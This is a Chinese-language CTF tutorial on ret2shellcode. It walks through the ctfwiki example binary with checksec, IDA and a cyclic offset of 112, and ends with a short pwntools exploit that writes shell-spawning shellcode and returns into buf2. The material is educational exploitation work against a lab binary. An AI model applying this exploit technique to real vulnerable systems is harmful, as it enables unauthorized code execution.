<a name="b6724cff"></a>
## 原理

 ret2shellcode，当程序当中没有system函数时，我们需要自己往栈上写入一段shellcode，然后控制eip使其指向shellcode的地址。

**shellcode** 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。

在栈溢出的基础上，要想执行 shellcode，需要对应的程序在运行时，shellcode 所在的区域具有可执行权限。即必须关闭堆栈不可执行功能。<br />![](https://img-blog.csdnimg.cn/20210221153712915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=bPkJ5&originHeight=386&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

<a name="039336d4"></a>
## 例题（来自ctfwiki）：

<a name="562b019f"></a>
### 首先checksec：

![](https://img-blog.csdnimg.cn/20210221153736960.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=o1F0N&originHeight=165&originWidth=376&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />发现程序没有开启任何保护，并且存在可读可写可执行段。

<a name="d8a8823b"></a>
### 然后ida32打开：

![](https://img-blog.csdnimg.cn/2021022115385818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=M9jEX&originHeight=271&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)首先观察到程序没有system函数，并且存在可读可写可执行段，存在栈溢出漏洞，考虑是ret2shellcode。<br />程序逻辑非常简单，通过gets函数读入数据给v4，然后再将v4的值复制到buf2中，而buf2正好处于可读可写可执行段中，所以shellcode的地址应该是buf2的地址。

![](https://img-blog.csdnimg.cn/202102211539177.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=SsAxY&originHeight=133&originWidth=804&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

通过cyclic确定需要填入的垃圾数据大小为112。

<a name="4f7d0e2b"></a>
### 思路：

首先向程序中写入shellcode，然后再填入垃圾数据，**shellcode和垃圾数据的大小之和为112**，可使用ljust方法，然后写入返回地址，程序写入后会被复制到buf2中，buf2的地址为0x804a080。

<a name="a3e6be45"></a>
### exp：

```python
from pwn import *
sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
#生成shellcode
buf2_addr = 0x804a080
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
#先写入shellcode，剩余位置用A补齐
sh.interactive()
```
